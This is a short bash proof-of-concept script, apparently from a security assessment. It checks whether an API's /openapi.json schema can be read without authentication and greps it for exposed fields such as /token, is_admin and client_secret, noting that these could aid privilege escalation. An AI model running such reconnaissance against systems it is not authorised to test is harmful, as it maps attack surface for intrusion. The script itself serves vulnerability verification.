#!/bin/bash

# POC: OpenAPI Schema Information Disclosure
# Demonstrates unauthenticated access to complete API specification

TARGET_URL="${1:-http://localhost:8080}"
OPENAPI_ENDPOINT="/openapi.json"

echo "[*] Testing unauthenticated access to OpenAPI schema endpoint"
echo "[*] Target: $TARGET_URL$OPENAPI_ENDPOINT"
echo ""

# Test unauthenticated access to OpenAPI schema
echo "[*] Sending unauthenticated request to OpenAPI endpoint..."
RESPONSE=$(curl -s -w "\n%{http_code}" "$TARGET_URL$OPENAPI_ENDPOINT")

# Extract HTTP status code
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
BODY=$(echo "$RESPONSE" | head -n-1)

echo "[*] HTTP Status Code: $HTTP_CODE"
echo ""

if [ "$HTTP_CODE" = "200" ]; then
    echo "[+] SUCCESS: OpenAPI schema is publicly accessible (HTTP 200)"
    echo ""
    
    # Check for sensitive information in the schema
    echo "[*] Analyzing schema for sensitive information..."
    echo ""
    
    # Check for /token endpoint
    if echo "$BODY" | grep -q "/token"; then
        echo "[!] FOUND: /token endpoint exposed in schema"
        echo "    - Reveals authentication endpoint structure"
    fi
    
    # Check for /edit_profile endpoint
    if echo "$BODY" | grep -q "/edit_profile"; then
        echo "[!] FOUND: /edit_profile endpoint exposed in schema"
    fi
    
    # Check for sensitive parameter names
    if echo "$BODY" | grep -q '"is_admin"'; then
        echo "[!] FOUND: Sensitive 'is_admin' parameter exposed in schema"
        echo "    - Could be leveraged for privilege escalation attempts"
    fi
    
    if echo "$BODY" | grep -q "client_secret"; then
        echo "[!] FOUND: OAuth/client credentials structure exposed"
        echo "    - Reveals authentication mechanism details"
    fi
    
    if echo "$BODY" | grep -q "company_id"; then
        echo "[!] FOUND: company_id parameter structure exposed"
        echo "    - Reveals multi-tenant architecture"
    fi
    
    # Check OpenAPI version
    if echo "$BODY" | grep -q "openapi"; then
        OPENAPI_VERSION=$(echo "$BODY" | grep -o '"openapi":"[^"]*"' | head -1)
        echo "[*] OpenAPI Version: $OPENAPI_VERSION"
    fi
    
    echo ""
    echo "[*] Full schema response (first 500 characters):"
    echo "---"
    echo "$BODY" | head -c 500
    echo "..."
    echo "---"
    echo ""
    echo "[+] VULNERABILITY CONFIRMED: Complete API schema accessible without authentication"
    exit 0
    
elif [ "$HTTP_CODE" = "401" ] || [ "$HTTP_CODE" = "403" ]; then
    echo "[-] OpenAPI endpoint requires authentication (HTTP $HTTP_CODE)"
    echo "[-] This is the SECURE configuration - vulnerability NOT present"
    exit 1
else
    echo "[-] Unexpected HTTP status code: $HTTP_CODE"
    echo "[-] Response body:"
    echo "$BODY"
    exit 1
fi